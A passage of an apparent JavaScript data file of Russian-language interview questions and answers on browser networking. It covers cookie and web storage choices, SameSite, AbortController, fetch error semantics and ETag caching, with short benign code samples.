        'Cookies автоматически отправляются на сервер с каждым запросом, ограничены 4 КБ и поддерживают атрибуты HttpOnly/Secure/SameSite. localStorage и sessionStorage существуют только на клиенте, объёмом до 5–10 МБ. localStorage переживает закрытие вкладки, sessionStorage — нет. Для session-токенов используют cookies с HttpOnly.',
      fullAnswer: `**Cookies** — старейший механизм, привязанный к домену. Браузер автоматически прикрепляет их к каждому HTTP-запросу к этому домену. Лимит около 4 КБ на cookie и около 50 cookies на домен. Поддерживают атрибуты:
- \`HttpOnly\` — недоступен через \`document.cookie\` (защита от XSS).
- \`Secure\` — отправляется только по HTTPS.
- \`SameSite=Strict|Lax|None\` — контроль отправки при кросс-сайтовых запросах.

Время жизни задаётся \`Max-Age\` или \`Expires\`. Без них — session cookie, которое удаляется при закрытии браузера.

**localStorage** — синхронный key-value на клиенте, ~5–10 МБ на origin, переживает перезагрузку и закрытие браузера. **Не отправляется** на сервер автоматически. API: \`setItem\`, \`getItem\`, \`removeItem\`, \`clear\`.

**sessionStorage** — то же API, но данные живут только в пределах вкладки: закрытие вкладки очищает хранилище. Открытие той же страницы в новой вкладке создаёт **новый** sessionStorage.

**Практические рекомендации.**
- **Сессионный токен** → cookie с HttpOnly + Secure + SameSite=Lax. Никогда не localStorage — XSS прочитает.
- **Тема, язык, флаги UI** → localStorage. Не нужны на сервере.
- **Черновик формы** → sessionStorage. Жизненный цикл совпадает с вкладкой.
- **Большие данные** (offline-кеш, файлы) → IndexedDB. Cookies/localStorage не подходят по размеру и/или синхронности API.

**Безопасность.** localStorage **уязвим к XSS** — любой скрипт, попавший на страницу, прочитает всё. Поэтому JWT в localStorage — только при полноценной защите (CSP, безопасные библиотеки, экранирование). Cookie с HttpOnly даёт защиту даже при наличии XSS — токен невозможно прочитать.`,
      followUps: [
        'Почему IndexedDB предпочтительнее localStorage для больших объёмов?',
        'Что происходит с sessionStorage при открытии страницы через target="_blank"?',
      ],
      relatedChapterId: 'cookies-storage',
    },
    {
      id: 'jsnw-iq4',
      question: 'Что делает SameSite=Strict?',
      shortAnswer:
        'SameSite=Strict запрещает браузеру отправлять cookie при любом кросс-сайтовом запросе, включая клик по ссылке с другого сайта. Это самая жёсткая защита от CSRF, но ломает SSO-сценарии: пользователь, перешедший по ссылке из почты, окажется неавторизованным.',
      fullAnswer: `Атрибут \`SameSite\` управляет отправкой cookie при кросс-сайтовых запросах и существует в трёх вариантах:

**SameSite=Strict.** Cookie отправляется **только** если запрос инициирован с того же сайта. Если пользователь кликает ссылку \`https://example.com/account\` из письма в Gmail, браузер откроет страницу **без** cookie — пользователь увидит экран логина, даже если был залогинен в example.com. Защита от CSRF максимальная: атакующий не может ни через ссылку, ни через скрытую форму, ни через img/iframe заставить браузер выполнить запрос с cookie.

**SameSite=Lax** (текущий дефолт во всех браузерах). Cookie отправляется при **top-level навигации** GET-запросом — это значит, переход по ссылке с другого сайта работает: пользователь окажется залогиненным. Но cookie **не** отправляется при fetch/XHR/iframe с другого сайта и при не-GET top-level запросах. Это баланс: защита от классической CSRF (POST через скрытую форму) сохраняется, а UX перехода по ссылке не ломается.

**SameSite=None.** Cookie отправляется всегда, как до появления атрибута. **Требует** \`Secure\` (только HTTPS). Используется для сторонних виджетов: платёжные iframe, чаты, аналитика, которые нужны на чужих сайтах.

**Практический выбор.**
- Сессионная cookie обычного веб-приложения → \`Lax\` (защита от CSRF + работающий UX).
- Cookie административной панели или банка → \`Strict\` (UX страдает, но безопасность важнее).
- Виджет/iframe для встройки на чужие сайты → \`None; Secure\`.

**История.** До 2020 года дефолтом было «отправлять всегда» — Chrome 80 сменил его на Lax. Старые приложения, рассчитывавшие на отправку cookie из iframe, после этого начали ломаться.`,
      followUps: [
        'Зачем для SameSite=None требуется Secure?',
        'Как SameSite=Lax влияет на CSRF-защиту через token-pattern?',
      ],
      relatedChapterId: 'cookies-storage',
    },
    {
      id: 'jsnw-iq5',
      question: 'Как отменить незавершённый fetch?',
      shortAnswer:
        'Создать AbortController, передать его signal в опции fetch, и вызвать controller.abort() — браузер разорвёт соединение, fetch реджектится с ошибкой, у которой name === "AbortError". Это настоящая отмена, в отличие от Promise.race с таймером.',
      fullAnswer: `**AbortController** — стандартный механизм отмены, появившийся в спецификации DOM. Он состоит из контроллера и связанного сигнала, которые передаются в любой API, поддерживающий отмену (fetch, addEventListener, ReadableStream).

\`\`\`js
const controller = new AbortController();
fetch('/api/data', { signal: controller.signal })
  .then((r) => r.json())
  .catch((err) => {
    if (err.name === 'AbortError') return; // намеренная отмена
    throw err;
  });

// Где-то позже:
controller.abort();
\`\`\`

При вызове \`abort()\` сигнал переходит в состояние aborted. Браузер разрывает TCP-соединение (или закрывает HTTP/2 stream), освобождает сокет и реджектит промис fetch ошибкой \`DOMException\` с \`name === 'AbortError'\`. Это именно настоящая отмена — сервер увидит закрытие соединения и может прервать обработку.

**Сравнение с Promise.race.** Гонка через \`Promise.race([fetch, timeout])\` — это **ложная** отмена: race игнорирует поздно пришедший результат, но fetch продолжает выполняться, скачивает ответ и держит соединение. На клиенте всё кажется отменённым, но трафик и серверные ресурсы тратятся.

**Типичные случаи использования.**
- **Race condition в поиске.** При каждом нажатии клавиши отменяем предыдущий запрос: иначе медленный ответ для «re» придёт после быстрого ответа для «react» и затрёт корректные данные.
- **Cleanup в useEffect (React).** Возвращаем функцию, которая вызывает \`controller.abort()\` — при unmount или смене зависимостей запрос отменяется.
- **Таймаут.** \`setTimeout(() => controller.abort(), ms)\` отменяет запрос, который выполняется слишком долго.

**Современные API.** \`AbortSignal.timeout(ms)\` (Node 17+, Chrome 103+) создаёт сигнал, автоматически отменяющий после ms. \`AbortSignal.any([s1, s2])\` объединяет несколько сигналов. Один контроллер может управлять несколькими fetch одновременно — все, кому передан его \`signal\`, отменяются вместе.`,
      followUps: [
        'Чем DOMException AbortError отличается от обычной TypeError при сетевом сбое?',
        'Что произойдёт, если вызвать abort() ПОСЛЕ того, как fetch уже резолвился?',
      ],
      relatedChapterId: 'abort-controller',
    },
    {
      id: 'jsnw-iq6',
      question: 'Почему fetch не бросает ошибку при HTTP-статусе 500?',
      shortAnswer:
        'Контракт fetch: промис реджектится только при сетевом сбое (нет соединения, DNS, CORS-блокировка, abort). Любой ответ сервера со статус-кодом — это валидный успех с объектом Response, у которого ok = false для не-2xx. Решение — проверять response.ok и явно бросать Error.',
      fullAnswer: `**Контракт fetch.** Промис \`fetch()\` реджектится **только** в случаях, когда HTTP-ответ не получен:
- Нет интернет-соединения, отказ DNS.
- CORS-блокировка (preflight провалился или нет нужных заголовков).
- Отмена через AbortController — \`AbortError\`.
- Серверный TLS-сертификат невалиден.

Любой ответ с сервера, даже 500 Internal Server Error, считается успехом: запрос дошёл, ответ получен. Промис резолвится с объектом \`Response\`, у которого \`status\` равен 500 и \`ok\` равен false.

**Почему так сделано.** Это согласуется со стандартом WHATWG Fetch и с поведением XMLHttpRequest. Авторы спецификации хотели единого контракта: «получили ответ или не получили». Семантическая интерпретация статуса (это ошибка или нет?) зависит от приложения: для одного API 404 — ошибка, для другого — нормальный ответ «не найдено».

**Практическое следствие.** Прямолинейный код становится скрытой ошибкой:

\`\`\`js
async function loadUser(id) {
  try {
    const res = await fetch(\`/api/users/\${id}\`);
    return await res.json(); // на 500 попытается распарсить тело ошибки
  } catch (err) {
    // сюда попадёт ТОЛЬКО при сетевом сбое
  }
}
\`\`\`

**Правильный шаблон.** Создаём обёртку, которая проверяет \`res.ok\` и бросает структурированную ошибку:

\`\`\`js
async function fetchJson(url, options) {
  const res = await fetch(url, options);
  if (!res.ok) {
    const body = await res.text();
    throw Object.assign(new Error(\`HTTP \${res.status}\`), { status: res.status, body });
  }
  return res.json();
}
\`\`\`

**Сравнение с axios.** axios по умолчанию бросает на не-2xx (через \`validateStatus\`), что многим кажется удобнее. Но и там можно настроить любое поведение. Главное — **знать контракт** библиотеки и не предполагать «как было бы логично».`,
      followUps: [
        'Что такое response.redirected и когда он становится true?',
        'Как отличить TypeError при сетевом сбое от ошибки в нашем коде?',
      ],
      relatedChapterId: 'fetch-api',
    },
    {
      id: 'jsnw-iq7',
      question: 'Зачем нужен ETag и как работает условный запрос?',
      shortAnswer:
        'ETag — хеш или версия содержимого, который сервер возвращает в заголовке. Браузер при следующем запросе отправляет If-None-Match с этим значением. Сервер сравнивает: если совпало — отвечает 304 Not Modified без тела (экономия трафика), если изменилось — отдаёт 200 с новым телом и новым ETag.',
      fullAnswer: `**Проблема.** Кеш с большим \`max-age\` может вернуть устаревшие данные. Кеш с маленьким \`max-age\` или \`no-cache\` заставляет каждый раз скачивать тело, даже если оно не изменилось — лишний трафик.

**Решение — условные запросы.** Сервер при первом ответе добавляет валидатор:

\`\`\`http
HTTP/1.1 200 OK
ETag: "v3-abc123"
Cache-Control: no-cache
Content-Type: application/json

[{ "id": 1, "name": "Alice" }]
\`\`\`

ETag — непрозрачный токен (для сервера это часто хеш содержимого или версия в БД). Браузер сохраняет его рядом с кешированным ответом. При следующем запросе:

\`\`\`http
GET /api/users HTTP/1.1
If-None-Match: "v3-abc123"
\`\`\`

Сервер сравнивает текущее значение ETag с переданным:
- **Совпало** → \`304 Not Modified\` без тела. Браузер берёт из кеша.
- **Не совпало** → \`200 OK\` с новым телом и новым ETag.

**Альтернатива — Last-Modified / If-Modified-Since.** Та же логика, но валидатор — дата изменения. ETag предпочтительнее: он различает любые изменения, а не только с точностью до секунды.

**Когда применять.** API с большими ответами и редкими изменениями (списки сущностей в админке, конфиги, словари). Экономия трафика при пагинации: страница 1 не перекачивается, если данные не изменились.

**Кто отдаёт ETag.** Веб-серверы (nginx, Apache) генерируют ETag для статических файлов автоматически. Для API — задача бэкенда. ETag = строка, обёрнутая в кавычки. Слабый ETag (\`W/"v3"\`) допускает семантическое равенство (например, gzip vs identity), сильный (\`"v3"\`) — побайтовое.

**Практическая нота.** На фронтенде явно работать с ETag не нужно — браузер сам управляет If-None-Match для своего HTTP-кеша. Но при ручной работе через fetch с заголовками или Service Worker этот паттерн пригодится.`,
      followUps: [
        'Чем сильный ETag отличается от слабого?',
        'Может ли промежуточный CDN добавлять/менять ETag?',
      ],
      relatedChapterId: 'caching',
    },
  ],

  nextTopics: [
    {
      slug: 'js-browser',
      reason: 'Навигация, History API, Service Worker — следующий слой работы с сетью на клиенте.',
    },
    {
      slug: 'node-network',
      reason: 'Та же тема со стороны сервера: как Node.js обслуживает HTTP, выставляет CORS и cookies.',
    },
  ],

  related: [
    { kind: 'pitfall', id: 'cors', label: 'Ловушка: Allow-Origin: * + credentials' },
    { kind: 'pitfall', id: 'fetch-ok', label: 'Ловушка: fetch не бросает на 4xx/5xx' },
  ],
};
